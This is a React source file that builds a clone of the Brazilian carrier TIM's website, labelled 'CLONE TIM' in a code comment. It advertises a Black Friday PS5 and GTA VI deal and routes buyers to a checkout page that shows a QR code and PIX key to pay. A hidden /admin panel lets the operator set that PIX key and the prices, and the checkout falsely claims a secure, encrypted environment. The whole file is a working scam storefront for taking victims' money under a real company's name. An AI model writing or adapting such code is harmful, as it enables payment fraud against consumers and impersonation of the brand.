import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Link, useNavigate } from 'react-router-dom';
import { 
  Search, 
  ShoppingCart, 
  Copy, 
  CheckCircle, 
  Lock, 
  Settings, 
  ArrowLeft, 
  Gamepad2, 
  CreditCard 
} from 'lucide-react';

// --- COMPONENTE: HOME (CLONE TIM) ---
const HomePage = ({ config }) => {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-[#001a4d] text-white font-sans">
      {/* Top Bar */}
      <div className="bg-[#001233] text-[10px] py-2 px-4 flex justify-between items-center border-b border-blue-900">
        <div className="flex gap-4">
          <span className="cursor-pointer hover:text-blue-300">Para você</span>
          <span className="cursor-pointer hover:text-blue-300">Para empresas</span>
          <span className="cursor-pointer hover:text-blue-300">Para operadoras</span>
          <span className="cursor-pointer hover:text-blue-300">Quem somos</span>
        </div>
        <div className="flex items-center gap-2">
          <span className="opacity-70">Rio de Janeiro, RJ</span>
        </div>
      </div>

      {/* Navbar */}
      <nav className="flex items-center justify-between px-6 py-4 bg-[#001a4d]">
        <div className="flex items-center gap-8">
          <div className="text-2xl font-black tracking-tighter text-white flex items-center">
            <span className="text-red-600 mr-1">■</span> TIM
          </div>
          <div className="hidden md:flex gap-6 text-sm font-medium opacity-90">
            <span className="cursor-pointer hover:text-blue-300">Black Friday</span>
            <span className="cursor-pointer hover:text-blue-300">Planos e Serviços</span>
            <span className="cursor-pointer hover:text-blue-300">Cobertura</span>
            <span className="cursor-pointer hover:text-blue-300">Por que TIM</span>
            <span className="cursor-pointer hover:text-blue-300">Ajuda</span>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <Search size={20} className="cursor-pointer opacity-70 hover:opacity-100" />
          <ShoppingCart size={20} className="cursor-pointer opacity-70 hover:opacity-100" />
        </div>
      </nav>

      {/* Hero Section */}
      <main className="relative px-6 py-12 max-w-7xl mx-auto grid md:grid-cols-2 gap-12 items-center">
        <div className="z-10">
          <p className="text-blue-300 font-bold text-sm mb-4 uppercase tracking-widest">
            Black Friday TIM 2026
          </p>
          <h1 className="text-4xl md:text-6xl font-black leading-tight mb-6">
            DUPLA INDECÊNCIA: <br />
            <span className="text-white">compre o PS5® e ganhe o GTA VI</span>
          </h1>

          {/* Price Box */}
          <div className="bg-gradient-to-r from-red-600 to-red-500 p-6 rounded-2xl shadow-2xl inline-block w-full max-w-md border-2 border-red-400">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-xs font-bold uppercase opacity-80">A partir de</p>
                <p className="text-4xl font-black">24x R$ {config.price}</p>
              </div>
              <div className="text-right border-l border-red-400 pl-6">
                <p className="text-xs font-bold uppercase opacity-80">Ou à vista</p>
                <p className="text-2xl font-black">R$ {config.cashPrice}</p>
              </div>
            </div>
            <p className="text-[10px] mt-4 opacity-80 italic">
              Nos planos TIM Ultracombo 9 ou TIM Black Família VIP
            </p>
          </div>

          <button 
            onClick={() => navigate('/checkout')}
            className="mt-8 bg-white text-[#001a4d] px-8 py-4 rounded-full font-bold text-lg hover:bg-blue-100 transition-all shadow-lg flex items-center gap-2 w-fit"
          >
            Comprar agora <ShoppingCart size={20} />
          </button>
        </div>

        {/* Product Image Mockup */}
        <div className="relative flex justify-center">
          <div className="absolute inset-0 bg-blue-500 blur-[120px] opacity-20 rounded-full"></div>
          <div className="relative z-10 flex gap-4 items-end">
            <img 
              src="https://m.media-amazon.com/images/I/61S6S-S-SXL._AC_SL1500_.jpg" 
              alt="PS5" 
              className="w-64 drop-shadow-2xl transform -rotate-6 hover:rotate-0 transition-transform duration-500"
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/pt/thumb/a/a2/Grand_Theft_Auto_VI_logo.png/800px-Grand_Theft_Auto_VI_logo.png" 
              alt="GTA VI" 
              className="w-48 mb-10 drop-shadow-2xl transform rotate-6 hover:rotate-0 transition-transform duration-500"
            />
          </div>
        </div>
      </main>
    </div>
  );
};

// --- COMPONENTE: CHECKOUT (PAGAMENTO) ---
const CheckoutPage = ({ config }) => {
  const [copied, setCopied] = useState(false);

  const copyPix = () => {
    navigator.clipboard.writeText(config.pixKey);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4 font-sans">
      <div className="bg-white w-full max-w-md rounded-3xl shadow-2xl overflow-hidden border border-gray-200">
        <div className="bg-[#001a4d] p-6 text-white text-center">
          <h2 className="text-2xl font-bold">Finalizar Pedido</h2>
          <p className="text-blue-200 text-sm">Pagamento Seguro via PIX</p>
        </div>

        <div className="p-8">
          <div className="flex items-center gap-4 mb-8 p-4 bg-blue-50 rounded-xl border border-blue-100">
            <div className="bg-blue-600 p-2 rounded-lg text-white">
              <Gamepad2 size={24} />
            </div>
            <div>
              <p className="font-bold text-gray-800">Combo PS5 + GTA VI</p>
              <p className="text-sm text-gray-500">Valor Total: R$ {config.cashPrice}</p>
            </div>
          </div>

          <div className="text-center mb-8">
            <p className="text-gray-600 text-sm mb-4">Escaneie o QR Code ou copie a chave abaixo:</p>
            
            {/* QR Code Mockup */}
            <div className="bg-white p-4 border-2 border-gray-200 rounded-2xl inline-block mb-6 shadow-sm">
              <img 
                src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${config.pixKey}`} 
                alt="QR Code PIX" 
                className="w-40 h-40"
              />
            </div>

            <div className="relative group">
              <input 
                readOnly 
                value={config.pixKey} 
                className="w-full p-4 bg-gray-50 border-2 border-dashed border-gray-300 rounded-xl text-center font-mono text-sm text-gray-700 focus:outline-none"
              />
              <button 
                onClick={copyPix}
                className="absolute right-2 top-2 bottom-2 bg-blue-600 text-white px-4 rounded-lg flex items-center gap-2 text-xs font-bold hover:bg-blue-700 transition-colors"
              >
                {copied ? <CheckCircle size={14} /> : <Copy size={14} />}
                {copied ? 'Copiado!' : 'Copiar'}
              </button>
            </div>
          </div>

          <div className="flex items-center justify-center gap-2 text-gray-400 text-xs mb-6">
            <Lock size={12} />
            <span>Ambiente criptografado e seguro</span>
          </div>

          <Link to="/" className="block text-center text-gray-500 text-sm hover:underline">
            Voltar para a loja
          </Link>
        </div>
      </div>
    </div>
  );
};

// --- COMPONENTE: PAINEL ADMIN (CONFIGURAÇÕES) ---
const AdminPanel = ({ config, setConfig }) => {
  const handleSave = (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const newConfig = {
      pixKey: formData.get('pixKey'),
      price: formData.get('price'),
      cashPrice: formData.get('cashPrice'),
    };
    setConfig(newConfig);
    localStorage.setItem('tim_config', JSON.stringify(newConfig));
    alert('Configurações atualizadas com sucesso!');
  };

  return (
    <div className="min-h-screen bg-gray-900 text-gray-100 p-6 font-sans">
      <div className="max-w-2xl mx-auto">
        <div className="flex items-center gap-4 mb-8">
          <div className="bg-blue-600 p-3 rounded-2xl">
            <Settings size={24} />
          </div>
          <h1 className="text-3xl font-bold">Painel de Controle</h1>
        </div>

        <form onSubmit={handleSave} className="bg-gray-800 p-8 rounded-3xl border border-gray-700 shadow-xl space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">Chave PIX de Recebimento</label>
            <input 
              name="pixKey" 
              defaultValue={config.pixKey}
              className="w-full p-4 bg-gray-700 border border-gray-600 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition-all" 
              placeholder="Ex: email, cpf ou chave aleatória"
              required
            />
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">Preço Parcelado (R$)</label>
              <input 
                name="price" 
                defaultValue={config.price}
                className="w-full p-4 bg-gray-700 border border-gray-600 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition-all" 
                placeholder="Ex: 99"
                required
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">Preço à Vista (R$)</label>
              <input 
                name="cashPrice" 
                defaultValue={config.cashPrice}
                className="w-full p-4 bg-gray-700 border border-gray-600 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition-all" 
                placeholder="Ex: 2.376"
                required
              />
            </div>
          </div>

          <button 
            type="submit" 
            className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-xl transition-all shadow-lg flex items-center justify-center gap-2"
          >
            <CheckCircle size={20} /> Salvar Alterações
          </button>
        </form>

        <div className="mt-8 p-4 bg-yellow-900/30 border border-yellow-700/50 rounded-xl text-yellow-200 text-xs leading-relaxed">
          <strong>Aviso:</strong> As alterações feitas aqui refletem instantaneamente na Home e no Checkout do cliente.
        </div>
      </div>
    </div>
  );
};

// --- APP PRINCIPAL (ORQUESTRADOR) ---
export default function App() {
  const [config, setConfig] = useState({
    pixKey: 'suachave@email.com',
    price: '99',
    cashPrice: '2.376',
  });

  useEffect(() => {
    const saved = localStorage.getItem('tim_config');
    if (saved) {
      setConfig(JSON.parse(saved));
    }
  }, []);

  return (
    <Router>
      <Routes>
        <Route path="/" element={<HomePage config={config} />} />
        <Route path="/checkout" element={<CheckoutPage config={config} />} />
        <Route path="/admin" element={<AdminPanel config={config} setConfig={setConfig} />} />
      </Routes>
    </Router>
  );
}